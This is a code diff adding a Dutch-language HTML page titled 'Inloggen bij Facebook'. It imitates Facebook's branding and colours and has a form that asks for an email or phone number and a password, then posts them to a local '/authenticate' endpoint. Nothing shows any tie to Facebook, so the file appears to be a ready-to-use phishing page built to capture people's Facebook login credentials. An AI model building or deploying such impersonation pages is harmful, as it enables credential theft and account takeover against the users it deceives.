@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Inloggen bij Facebook</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f0f2f5; /* Facebook grijze achtergrondkleur */
+    }
+
+    .container {
+      text-align: center;
+      background-color: white;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    /* Facebook logo */
+    .logo {
+      font-family: 'Helvetica', sans-serif; /* Simpel font */
+      font-size: 36px;
+      font-weight: bold;
+      color: #1877f2; /* Facebook blauw */
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 14px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      background-color: #f5f6f7;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #1877f2; /* Facebook blauw als focus */
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #1877f2; /* Facebook blauw */
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #165dc3; /* Donkerder blauw */
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <!-- Facebook-logo -->
+    <div class="logo">facebook</div>
+
+    <h2>Log in om door te gaan</h2>
+    <form action="/authenticate" method="POST">
+      <input type="text" name="username" placeholder="E-mailadres of telefoonnummer" required>
+      <input type="password" name="password" placeholder="Wachtwoord" required>
+      <button type="submit">Inloggen</button>
+    </form>
+  </div>
+
+</body>
+</html>
